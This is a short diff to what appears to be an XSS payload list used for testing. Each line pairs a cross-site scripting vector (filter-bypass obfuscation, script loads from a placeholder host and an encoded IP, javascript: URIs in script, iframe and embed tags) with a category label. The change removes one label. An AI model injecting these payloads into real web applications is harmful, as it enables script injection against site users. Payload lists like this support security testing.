@@ -59,7 +59,7 @@ top[8680439..toString(30)](1)@XSS Filter Bypass Alert Obfuscation
 <script src=//yoursite.com/1.js>@XSS Code Reuse Regular Script
 <script src=//3334957647/1>@XSS Code Reuse Regular Script
 <x onxxx=alert(1) 1='@XSS Generic Source Breaking
-<script>alert(1)</script> @XSS Without Event Handlers
+<script>alert(1)</script>
 <script src=javascript:alert(1)> @XSS Without Event Handlers
 <iframe src=javascript:alert(1)> @XSS Without Event Handlers
 <embed src=javascript:alert(1)> @XSS Without Event Handlers
